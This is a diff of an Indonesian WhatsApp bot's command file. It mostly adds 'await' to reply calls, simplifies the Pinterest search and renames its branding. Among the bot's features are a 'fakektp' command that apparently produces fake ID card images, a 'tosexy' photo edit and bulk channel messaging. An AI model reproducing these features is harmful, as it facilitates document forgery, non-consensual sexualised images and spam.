 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'harisangar': case 'taliwangke': {
@@ -29014,7 +29026,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'harinaas': case 'harisial': {
@@ -29023,7 +29035,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
+await replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
 }
 break
 case 'nagahari': case 'harinaga': {
@@ -29032,7 +29044,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'arahrejeki': case 'arahrezeki': {
@@ -29041,7 +29053,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'peruntungan': {
@@ -29050,7 +29062,7 @@ if (!text) return replyV1(`Contoh : ${command} DIka, 7, 7, 2005, 2022\n\nNote : 
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'weton': case 'wetonjawa': {
@@ -29059,7 +29071,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
+await replyV1(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
 }
 break
 case 'sifat': case 'karakter': {
@@ -29068,7 +29080,7 @@ if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
+await replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
 }
 break
 case 'keberuntungan': {
@@ -29077,7 +29089,7 @@ if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
+await replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
 }
 break
 case 'memancing': {
@@ -29086,7 +29098,7 @@ if (!text) return replyV1(`Contoh : ${command} 12, 1, 2022`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 
@@ -29096,7 +29108,7 @@ if (!text) return replyV1(`Contoh : ${command} 12, 1, 2022, 28\n\nNote : ${comma
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'zodiak': case 'zodiac': {
@@ -29132,7 +29144,7 @@ let zodiac = await getZodiac(birth[1], birth[2])
 
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'shio': {
@@ -29140,7 +29152,7 @@ case 'shio': {
 if (!text) return replyV1(`Contoh : ${command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
 let anu = await primbon.shio(text)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Hasil :* ${anu.message}`)
+await replyV1(`• *Hasil :* ${anu.message}`)
 }
 break  
 //MENU EPHOTO
@@ -29291,7 +29303,7 @@ case 'igstalk': {
         await sendRichStalk(conn, m.chat, 'instagram', text.trim());
     } catch (err) {
         console.error('[STALK IG]', err?.stack || err);
-        replyV1(formatStalkError(err, 'Instagram'));
+        await replyV1(formatStalkError(err, 'Instagram'));
     }
 }
 break;
@@ -29304,7 +29316,7 @@ case 'ttstalk': {
         await sendRichStalk(conn, m.chat, 'tiktok', text.trim());
     } catch (err) {
         console.error('[STALK TIKTOK]', err?.stack || err);
-        replyV1(formatStalkError(err, 'TikTok'));
+        await replyV1(formatStalkError(err, 'TikTok'));
     }
 }
 break;
@@ -29317,7 +29329,7 @@ case 'mobilelegendstalk': {
         await sendRichStalk(conn, m.chat, 'mlbb', text.trim());
     } catch (err) {
         console.error('[STALK MLBB]', err?.stack || err);
-        replyV1(formatStalkError(err, 'Mobile Legends'));
+        await replyV1(formatStalkError(err, 'Mobile Legends'));
     }
 }
 break;
@@ -29330,7 +29342,7 @@ case 'robloxstalk': {
         await sendRichStalk(conn, m.chat, 'roblox', text.trim());
     } catch (err) {
         console.error('[STALK ROBLOX]', err?.stack || err);
-        replyV1(formatStalkError(err, 'Roblox'));
+        await replyV1(formatStalkError(err, 'Roblox'));
     }
 }
 break;
@@ -29343,7 +29355,7 @@ case 'telegramstalk': {
         await sendRichStalk(conn, m.chat, 'telegram', text.trim());
     } catch (err) {
         console.error('[STALK TELEGRAM]', err?.stack || err);
-        replyV1(formatStalkError(err, 'Telegram'));
+        await replyV1(formatStalkError(err, 'Telegram'));
     }
 }
 break;
@@ -29357,7 +29369,7 @@ case 'stalkyoutube': {
         await sendRichStalk(conn, m.chat, 'youtube', text.trim());
     } catch (err) {
         console.error('[STALK YOUTUBE]', err?.stack || err);
-        replyV1(formatStalkError(err, 'YouTube'));
+        await replyV1(formatStalkError(err, 'YouTube'));
     }
 }
 break;
@@ -29372,7 +29384,7 @@ case 'rwm':
 
     if (!/image/.test(mime)) return replyV1(`mana foto nya?`);
 
-    replyV1('⏳ Sedang menghapus watermark...');
+    await replyV1('⏳ Sedang menghapus watermark...');
 
     let mediaPath;
 
@@ -29399,7 +29411,7 @@ case 'rwm':
 
     } catch (error) {
         console.error('Error di removewm:', error);
-        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
+        await replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29419,7 +29431,7 @@ case 'ailuma': {;
         return replyV1('📸 Kirim atau Reply gambar untuk menggunakan fitur ini!');
     }
 
-    replyV1('⏳ Upload & Generating Video...');
+    await replyV1('⏳ Upload & Generating Video...');
 
     let mediaPath;
     let result;
@@ -29427,8 +29439,12 @@ case 'ailuma': {;
         mediaPath = await conn.downloadAndSaveMediaMessage(quotedMsg);
         const buffer = fs.readFileSync(mediaPath);
 
+        let lastProgressNoticeAt = 0;
         result = await Luma(buffer, (prog) => {
-            replyV1(`⚙️ ${prog}`);
+            const now = Date.now();
+            if (now - lastProgressNoticeAt < 5000) return;
+            lastProgressNoticeAt = now;
+            void replyV1Safe(`⚙️ ${prog}`);
         });
 
         await conn.sendMessage(m.chat, {
@@ -29438,7 +29454,7 @@ case 'ailuma': {;
 
     } catch (err) {
         console.error(err);
-        replyV1(`❌ Error proses: ${err?.message || err}`);
+        await replyV1(`❌ Error proses: ${err?.message || err}`);
     }
 
     if (mediaPath && fs.existsSync(mediaPath)) {
@@ -29461,7 +29477,7 @@ case 'tofigura': {
         return replyV1(`mana foto nya?`);
     }
  
-    replyV1('Loading...');
+    await replyV1('Loading...');
 
     try {
         
@@ -29483,7 +29499,7 @@ case 'tofigura': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
+        await replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29502,7 +29518,7 @@ case 'tosexy': {
         return replyV1(`mana foto nya?`);
     }
  
-    replyV1('Loading...');
+    await replyV1('Loading...');
 
     try {
         
@@ -29524,7 +29540,7 @@ case 'tosexy': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
+        await replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29542,7 +29558,7 @@ case 'hitamkan': {
         return replyV1(`mana foto nya?`);
     }
  
-    replyV1('Loading...');
+    await replyV1('Loading...');
 
     try {
         
@@ -29563,7 +29579,7 @@ case 'hitamkan': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
+        await replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29584,7 +29600,7 @@ case 'edit': {
         return replyV1(`⚠️ Masukkan perintah edit (prompt)!\n\nContoh: ${cmd} ubah jadi sketsa pensil`);
     }
  
-    replyV1('Loading...');
+    await replyV1('Loading...');
 
     try {
         
@@ -29606,7 +29622,7 @@ case 'edit': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
+        await replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29624,7 +29640,7 @@ case 'tobersama': {
     }
     if (!text) return replyV1(`contoh ${cmd} nama idola mu`)
  
-    replyV1('Loading...');
+    await replyV1('Loading...');
 
     try {
         
@@ -29646,7 +29662,7 @@ case 'tobersama': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
+        await replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29686,7 +29702,7 @@ case 'toanime': {
         return replyV1(`mana foto nya?`);
     }
  
-    replyV1('Loading...');
+    await replyV1('Loading...');
 
     try {
         
@@ -29708,7 +29724,7 @@ case 'toanime': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
+        await replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29869,100 +29885,33 @@ case 'pinfoto': {
 
     await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } }).catch(() => {})
     await replyV1(`🔎 Sedang mencari Pinterest: *${query}* ...`)
-    const searchPinterest = async (searchQuery) => {
-        const cookiesResponse = await axios.get('https://www.pinterest.com/csrf_error/', {
-            timeout: 20000,
-            headers: { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36' }
-        })
-        const cookieHeaders = cookiesResponse.headers?.['set-cookie'] || []
-        const cookies = cookieHeaders.map(item => String(item).split(';')[0]).filter(Boolean).join('; ')
-        if (!cookies) throw new Error('Pinterest tidak memberikan cookie pencarian.')
-        const { data } = await axios.get('https://www.pinterest.com/resource/BaseSearchResource/get/', {
-            timeout: 30000,
-            headers: {
-                accept: 'application/json, text/javascript, */*; q=0.01',
-                cookie: cookies,
-                referer: 'https://www.pinterest.com/',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36',
-                'x-requested-with': 'XMLHttpRequest'
-            },
-            params: {
-                source_url: `/search/pins/?q=${encodeURIComponent(searchQuery)}`,
-                data: JSON.stringify({ options: { isPrefetch: false, query: searchQuery, scope: 'pins', no_fetch_context_on_resource: false }, context: {} }),
-                _: Date.now()
-            }
-        })
-        return (data?.resource_response?.data?.results || [])
-            .filter(item => item?.images?.orig?.url)
-            .map(item => ({
-                image: item.images.orig.url,
-                title: String(item.grid_title || searchQuery).slice(0, 120),
-                source: `https://www.pinterest.com/pin/${item.id || ''}`
-            }))
-    }
-
     try {
-        let results = []
-        try { results = await searchPinterest(query) } catch (error) {
-            console.warn('[PINTEREST SEARCH PRIMARY ERROR]', error?.response?.status ? `HTTP ${error.response.status}` : (error?.message || error))
-        }
-        // Fallback 1: scraper lama. Endpoint Pinterest sering membalas 403 untuk IP VPS,
-        // jadi jangan menganggap kegagalan provider pertama berarti hasil kosong.
-        if (!results.length) {
-            try {
-                const fallback = await pinterest2(query)
-                results = (Array.isArray(fallback) ? fallback : []).filter(item => item?.images_url).map(item => ({
-                    image: item.images_url,
-                    title: String(item.grid_title || query).slice(0, 120),
-                    source: item.pin || item.link || ''
-                }))
-            } catch (fallbackError) {
-                console.warn('[PINTEREST SEARCH FALLBACK ERROR]', fallbackError?.message || fallbackError)
-            }
-        }
-        // Fallback 2: provider pencarian alternatif; tidak memakai cookie Pinterest.
-        // Format respons provider dapat berbeda antarversi, maka normalisasi beberapa bentuk umum.
-        if (!results.length) {
-            try {
-                const apiResponse = await axios.get('https://api.siputzx.my.id/api/s/pinterest', {
-                    params: { query },
-                    timeout: 20000,
-                    headers: {
-                        accept: 'application/json',
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36'
-                    }
-                })
-                const payload = apiResponse?.data
-                const items = Array.isArray(payload) ? payload :
-                    (Array.isArray(payload?.data) ? payload.data :
-                    (Array.isArray(payload?.result) ? payload.result :
-                    (Array.isArray(payload?.results) ? payload.results : [])))
-                results = items.map(item => ({
-                    image: item?.images_url || item?.image || item?.imageUrl || item?.url || item?.src || item?.images?.orig?.url || item?.images?.['736x']?.url,
-                    title: String(item?.grid_title || item?.title || item?.name || query).slice(0, 120),
-                    source: item?.pin || item?.link || item?.source || ''
-                })).filter(item => typeof item.image === 'string' && /^https?:\/\//i.test(item.image))
-            } catch (apiError) {
-                console.warn('[PINTEREST SEARCH API FALLBACK ERROR]', apiError?.response?.status || apiError?.message || apiError)
-            }
-        }
-        if (!results.length) return replyV1(`❌ Pencarian gambar Pinterest sedang dibatasi oleh layanan (sering berupa HTTP 403) atau tidak menemukan hasil untuk *${query}*. Coba lagi beberapa saat lagi. Jika berlanjut, cek log [PINTEREST SEARCH] di console.`)
+        const results = (await pinterestSearch(query)).map(item => ({
+            image: item?.images_url,
+            title: String(item?.grid_title || query).slice(0, 120),
+            source: item?.pin || item?.link || ''
+        })).filter(item => typeof item.image === 'string' && /^https:\/\//i.test(item.image));
+        if (!results.length) return replyV1(`❌ Pencarian Pinterest belum mengembalikan hasil valid untuk *${query}*. Pinterest atau provider cadangan mungkin sedang membatasi permintaan. Coba lagi setelah jeda dan periksa log [PINTEREST SEARCH] di console.`)
         const count = Math.min(imgCount, results.length, 10)
-        await replyV1(`✅ Ditemukan ${results.length} gambar. Mengirim ${count} gambar untuk *${query}*.`)
+        const selectedResults = results.slice(0, count)
         let sent = 0
-        for (const item of results.slice(0, count)) {
+        let usedCarousel = false
+        if (selectedResults.length >= 2) {
             try {
-                await conn.sendMessage(m.chat, {
-                    image: { url: item.image },
-                    caption: `📌 *${item.title || query}*\n🔗 ${item.source || 'Pinterest'}\n\n_Hasil pencarian Pinterest; bukan konten buatan Xeryuu._`
-                }, { quoted: m })
-                sent++
-                await sleep(350)
-            } catch (sendError) {
-                console.error('[PINTEREST SEND ERROR]', sendError?.message || sendError)
+                sent = await sendPinterestCarousel(conn, m, selectedResults, query, count)
+                usedCarousel = sent >= 2
+            } catch (carouselError) {
+                console.warn('[PINTEREST CAROUSEL FALLBACK]', carouselError?.message || carouselError)
+                sent = await sendPinterestSearchFallback(conn, m, selectedResults, query, count)
             }
+        } else {
+            sent = await sendPinterestSearchFallback(conn, m, selectedResults, query, count)
         }
-        return replyV1(`✅ Berhasil mengirim ${sent}/${count} gambar Pinterest.`)
+        if (!sent) return replyV1('❌ Gambar ditemukan, tetapi WhatsApp gagal mengirim hasilnya. Coba lagi nanti.')
+        if (!usedCarousel && selectedResults.length >= 2) {
+            await replyV1('ℹ️ Library WhatsApp tidak berhasil mengirim format carousel pada percobaan ini; hasil dikirim sebagai foto terpisah.')
+        }
+        return replyV1(`✅ Berhasil mengirim ${sent} gambar Pinterest${usedCarousel ? ' dalam carousel geser' : ''}.`)
     } catch (err) {
         console.error('[PINTEREST ERROR]', err?.stack || err)
         return replyV1('❌ Pencarian Pinterest gagal. Layanan mungkin membatasi permintaan; coba lagi nanti.')
@@ -29972,7 +29921,7 @@ break
 
 case 'playstore': {
 if (!text) return replyV1(`${prefix + command} WhatsApp`)
-replyV1('Proses..')
+await replyV1('Proses..')
 await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async (res) => {
 let response = await res.json()
 let teks = '*🔎 Hasil Pencarian PLAY STORE*\n\n'
@@ -29983,7 +29932,7 @@ teks += `*◦ Rating :* ${i.rate}\n`
 teks += `*◦ Link Developer Url :* ${i.link_dev}\n`
 teks += `*◦ Link Apps Url :* ${i.link}\n\n`
 }
-replyV1(teks)
+await replyV1(teks)
 }).catch(err => replyV1('Error 🗿'))
 }
 break
@@ -30028,7 +29977,7 @@ case 'fakektp': {
         const response = await fetch(url);
         
         if (!response.ok) {
-            replyV1 (`*🍂 Gagal mengambil gambar!*\n*Status server:* ${response.status} ${response.statusText}`);
+            await replyV1 (`*🍂 Gagal mengambil gambar!*\n*Status server:* ${response.status} ${response.statusText}`);
         }
 
         const buffer = await response.arrayBuffer();
@@ -30037,7 +29986,7 @@ case 'fakektp': {
         }, { quoted: m });
 
     } catch (error) {
-        replyV1(`*🍂 Terjadi kesalahan!*\n\n*Pesan error:* ${error.message}\n*Tips:* Periksa kembali URL foto atau koneksi internet Anda.`);
+        await replyV1(`*🍂 Terjadi kesalahan!*\n\n*Pesan error:* ${error.message}\n*Tips:* Periksa kembali URL foto atau koneksi internet Anda.`);
     } finally {
         await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
     }
@@ -30054,7 +30003,7 @@ case 'dongeng': {
  caption: caption
  }, { quoted: m });
  } catch (e) {
- replyV1('Gagal mengambil dongeng. Coba lagi nanti.');
+ await replyV1('Gagal mengambil dongeng. Coba lagi nanti.');
  console.error(e);
  }
 }
@@ -30082,10 +30031,10 @@ case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
 
 📍 *Rute Perjalanan:* 
 ${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
- replyV1(msg);
+ await replyV1(msg);
  } catch (e) {
  console.error(e);
- replyV1('Terjadi kesalahan saat mengambil data!');
+ await replyV1('Terjadi kesalahan saat mengambil data!');
  }
  break
 case "cecan": case "cn": {
@@ -30176,7 +30125,7 @@ case 'cogan': {
  }, { quoted: m });
  } catch (err) {
  console.error(err);
- replyV1('Gagal mengambil data cogan.');
+ await replyV1('Gagal mengambil data cogan.');
  }
  }
  break
@@ -30248,7 +30197,7 @@ case 'roasting': {
  });
  } catch (error) {
  console.error("Error saat mengirim pesan:", error);
- replyV1('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
+ await replyV1('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
  }
 }
 break
@@ -30275,7 +30224,7 @@ const axios = require('axios');
  fs.unlinkSync(mediaPath);
  } catch (err) {
  console.log(err);
- replyV1("Gagal memproses gambar.");
+ await replyV1("Gagal memproses gambar.");
  }
 }
 break
@@ -30444,7 +30393,7 @@ const buffer = await conn.downloadMediaMessage(m.quoted);
         }, { quoted: m });
 
     } catch (e) {
-        replyV1(`Terjadi error: ${e.message}`);
+        await replyV1(`Terjadi error: ${e.message}`);
     } finally {
         const fs = require('fs');
         if (tmpPath && fs.existsSync(tmpPath)) {
@@ -30578,7 +30527,7 @@ case 'hdvideo': {
                     caption: `✅ Video berhasil diubah ke ${res.toUpperCase()} ${fps}FPS`
                 }, { quoted: m });
             } catch (sendError) {
-                replyV1("Gagal mengirim video yang telah diproses.");
+                await replyV1("Gagal mengirim video yang telah diproses.");
             } finally {
                 delete conn.videohd[m.sender];
                 if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
@@ -30591,7 +30540,7 @@ case 'hdvideo': {
         });
 
     } catch (e) {
-        replyV1("Terjadi kesalahan: " + e.message);
+        await replyV1("Terjadi kesalahan: " + e.message);
         delete conn.videohd[m.sender];
         if (inputPath && fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
         if (outputPath && fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
@@ -30632,18 +30581,18 @@ case "brat": {
     const bratText = String(text || '').trim()
     if (!bratText) return replyV1(`Contoh: ${prefix + command} Halo dunia`)
     try {
-        // Ikuti alur visual Furina: generator BRAT, peningkatan kualitas gambar,
+        // Ikuti alur visual Xeryuu: generator BRAT, peningkatan kualitas gambar,
         // lalu konversi ke stiker. Renderer hijau lokal menjadi fallback jika API mati.
         // Kompatibilitas jika library/brat.js di server masih versi lama.
-        // Prioritaskan renderer Furina; fallback ke renderer BRAT lokal yang tersedia.
+        // Prioritaskan renderer Xeryuu; fallback ke renderer BRAT lokal yang tersedia.
         let imageBuffer
-        if (typeof bratService.createFurinaStyleBrat === 'function') {
-            imageBuffer = await bratService.createFurinaStyleBrat(bratText)
+        if (typeof bratService.createXeryuuStyleBrat === 'function') {
+            imageBuffer = await bratService.createXeryuuStyleBrat(bratText)
         } else if (typeof bratService.createLocalClassicBratImage === 'function') {
-            console.warn('[BRAT] createFurinaStyleBrat tidak tersedia; memakai renderer lokal.')
+            console.warn('[BRAT] createXeryuuStyleBrat tidak tersedia; memakai renderer lokal.')
             imageBuffer = await bratService.createLocalClassicBratImage(bratText)
         } else if (typeof bratService.createBratImage === 'function') {
-            console.warn('[BRAT] Renderer Furina/lokal tidak tersedia; memakai createBratImage.')
+            console.warn('[BRAT] Renderer Xeryuu/lokal tidak tersedia; memakai createBratImage.')
             imageBuffer = await bratService.createBratImage(bratText, { backgroundColor: '#a8ff9e', fontColor: '#111111' })
         } else {
             throw new Error('Modul library/brat.js tidak memiliki renderer BRAT yang kompatibel. Salin library/brat.js dari ZIP revisi lalu restart bot.')
@@ -30666,7 +30615,7 @@ case "brat": {
             author: global.author
         })
     } catch (error) {
-        console.error('[BRAT FURINA STYLE ERROR]', error?.stack || error)
+        console.error('[BRAT XERYUU STYLE ERROR]', error?.stack || error)
         await replyV1(`❌ Gagal membuat stiker BRAT.\n${String(error?.message || error).slice(0, 220)}`)
     }
 }
@@ -30685,7 +30634,7 @@ case 'animebrat': {
 }
 break
 
-case 'furinabrat':
+case 'xeryuubrat':
 case 'bratbahlil':
 case 'bahlilbrat': {
     if (!text?.trim()) return replyV1(`Contoh: ${prefix + command} Halo dunia`)
@@ -31331,7 +31280,7 @@ case "jpmch": {
 Silakan daftarkan saluran terlebih dahulu. 
 `); 
 
- replyV1(` 
+ await replyV1(` 
 ╭─❰ PROCESSING MESSAGE ❱─╮ 
 📮 Mengirim Pesan Ke: 
  ➥ ${global.channels.length} Saluran
@@ -31349,7 +31298,7 @@ Silakan daftarkan saluran terlebih dahulu.
  await sleep(global.delayjpmch); // jeda tiap pengiriman 
  } 
  
- replyV1(` 
+ await replyV1(` 
 ╭─❰ RESULT SUMMARY ❱─╮ 
 📨 Pesan Terkirim: 
  ➥ ${total} Saluran 
@@ -31377,7 +31326,7 @@ case "delidch": {
         let removed = global.channels.splice(index, 1);
         saveChannels(global.channels);
 
-        replyV1(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
+        await replyV1(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
     } else {
         let channelId = text.trim();
 
@@ -31388,7 +31337,7 @@ case "delidch": {
         global.channels = global.channels.filter((id) => id !== channelId);
         saveChannels(global.channels);
 
-        replyV1(`Berhasil menghapus ID Saluran: ${channelId}`);
+        await replyV1(`Berhasil menghapus ID Saluran: ${channelId}`);
     }
 }
 break
@@ -31420,10 +31369,10 @@ case "addidch": {
  global.channels.push(res.id);
  saveChannels(global.channels);
 
- replyV1(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
